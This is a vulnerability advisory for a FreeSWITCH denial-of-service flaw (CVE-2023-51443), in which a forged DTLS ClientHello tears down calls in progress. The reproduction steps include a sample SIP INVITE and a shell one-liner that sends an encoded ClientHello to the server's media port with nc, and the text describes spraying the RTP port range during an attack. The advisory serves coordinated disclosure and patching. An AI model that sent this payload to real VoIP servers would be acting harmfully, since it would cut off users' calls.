# FreeSWITCH susceptible to Denial of Service via DTLS Hello packets during call initiation

- Fixed versions: 1.10.11
- Enable Security Advisory: https://github.com/EnableSecurity/advisories/tree/master/ES2023-02-freeswitch-dtls-hello-race
- Vendor Security Advisory: https://github.com/signalwire/freeswitch/security/advisories/GHSA-39gv-hq72-j6m6
- Other references: CVE-2023-51443
- Tested vulnerable versions: 1.10.10
- Timeline:
	- Report date: 2023-09-27
	- Triaged: 2023-09-27
	- Fix provided for testing: 2023-09-29
	- Vendor release with fix: 2023-12-22
	- Enable Security advisory: 2023-12-22

## TL;DR

When handling DTLS-SRTP for media setup, FreeSWITCH is susceptible to Denial of Service due to a race condition in the hello handshake phase of the DTLS protocol. This attack can be done continuously, thus denying new DTLS-SRTP encrypted calls during the attack.

## Description

Our research has shown that key establishment for Secure Real-time Transport Protocol (SRTP) using Datagram Transport Layer Security Extension (DTLS)[^1] is susceptible to a Denial of Service attack due to a race condition. If an attacker manages to send a ClientHello DTLS message with an invalid CipherSuite (such as `TLS_NULL_WITH_NULL_NULL`) to the port on the FreeSWITCH server that is expecting packets from the caller, a DTLS error is generated. This results in the media session being torn down, which is followed by teardown at signaling (SIP) level too.

This behavior was tested against FreeSWITCH version 1.10.10, which was found to be vulnerable to this issue.

The following sequence diagram shows the normal flow (i.e. no attack) involving SIP and DTLS messages between a UAC (the Caller) and an FreeSWITCH server capable of handling WebRTC calls.

Diagram showing a call setup against FreeSWITCH that uses SIP and DTLS:
![Diagram showing a call setup against FreeSWITCH that uses SIP and DTLS](https://user-images.githubusercontent.com/4557407/271063734-85425e09-6945-49b1-ba73-751b6d592ea4.png)

In a controlled experiment, it was observed that when the Attacker sent a DTLS ClientHello to FreeSWITCH's media port from a different IP and port, FreeSWITCH responded by sending a DTLS Alert to the Caller. Additionally, FreeSWITCH terminated the SIP call by sending a BYE message to the Caller.

![Diagram showing a call setup against FreeSWITCH that fails due to an attacker controlled DTLS ClientHello](https://user-images.githubusercontent.com/4557407/271064011-032f9a0e-15af-4645-b008-1fe8b706d75e.png)

During a real attack, the attacker would spray a vulnerable FreeSWITCH server with DTLS ClientHello messages. The attacker would typically target the range of UDP ports allocated for RTP. When the ClientHello message from the Attacker wins the race against an expected ClientHello from the Caller, the call terminates, resulting in Denial of Service.


## Impact

Abuse of this vulnerability may lead to a massive Denial of Service on vulnerable FreeSWITCH servers for calls that rely on DTLS-SRTP.

## How to reproduce the issue

1. Prepare a FreeSWITCH server with an extension configured to handle WebRTC
1. Send an INVITE message to the target server with WebRTC SDP:

    ```default
	INVITE sip:1000@192.168.1.202 SIP/2.0
	Via: SIP/2.0/WSS 192.168.1.202:36742;rport=36742;branch=z9hG4bK-jQcnXJadB2VGfGmQ
	Max-Forwards: 70
	From: <sip:1000@192.168.1.202>;tag=L9kc5NfpYG1u67cT
	To: <sip:1000@192.168.1.202>
	Contact: <sip:1000@192.168.1.202>
	Call-ID: DzGnBLt0z9SK3MC0
	CSeq: 5 INVITE
	Content-Type: application/sdp
	Content-Length: 385

	v=0
	o=- 1695296331 1695296331 IN IP4 192.168.1.202
	s=-
	t=0 0
	c=IN IP4 192.168.1.202
	m=audio 45825 UDP/TLS/RTP/SAVPF 0 8 101
	a=setup:active
	a=fingerprint:sha-256 49:05:98:B2:15:43:1C:9C:4F:29:07:60:F8:63:77:16:80:F9:44:C0:97:8E:E5:48:D6:71:B4:03:10:85:D6:E3
	a=rtpmap:0 PCMU/8000/1
	a=rtpmap:8 PCMA/8000/1
	a=rtpmap:101 telephone-event/8000
	a=rtcp-mux
	a=rtcprsize
	a=sendrecv
	```
1. Note FreeSWITCH's media port and IP values, which will be used as the `<freeswitch-ip>` and `<media-port>` parameters by the Attacker
1. Send a DTLS ClientHello message from a (attacker-controlled) host, which is different from the Caller but has network access to the FreeSWITCH server

    ```bash
	CLIENT_HELLO="Fv7/AAAAAAAAAAAAfAEAAHAAAAAAAAAAcP79AAA" 
	CLIENT_HELLO="${CLIENT_HELLO}AAG4HCVaUNVbYVmxuqdn2WyCgtTijhZ+WheP/+H"
	CLIENT_HELLO="${CLIENT_HELLO}4AAAACAAABAABEABcAAP8BAAEAAAoACAAGAB0AF"
	CLIENT_HELLO="${CLIENT_HELLO}wAYAAsAAgEAACMAAAANABQAEgQDCAQEAQUDCAUF"
	CLIENT_HELLO="${CLIENT_HELLO}AQgGBgECAQAOAAkABgABAAgABwA="
	echo -n "${CLIENT_HELLO}" | base64 --decode | nc -u <freeswitch-ip> <media-port>
	```
1. Observe that the Caller received a DTLS Alert message and a SIP BYE message on its signaling channel

Note that the above steps are used to reliably reproduce the vulnerability. In case of a real attack, the attacker simply has to spray the FreeSWITCH server with DTLS messages.

## Solution and recommendations

To address this vulnerability, upgrade FreeSWITCH to the latest version which includes the security fix. The solution implemented is to drop all packets from addresses that have not been validated by an ICE check.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) develops offensive security tools and provides quality penetration testing to help protect your real-time communications systems against attack.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.

## Disclosure policy

This report is subject to Enable Security's vulnerability disclosure policy which can be found at <https://github.com/EnableSecurity/Vulnerability-Disclosure-Policy>.

[^1]: Datagram Transport Layer Security (DTLS) Extension to Establish Keys for the Secure Real-time Transport Protocol (SRTP) https://datatracker.ietf.org/doc/html/rfc5764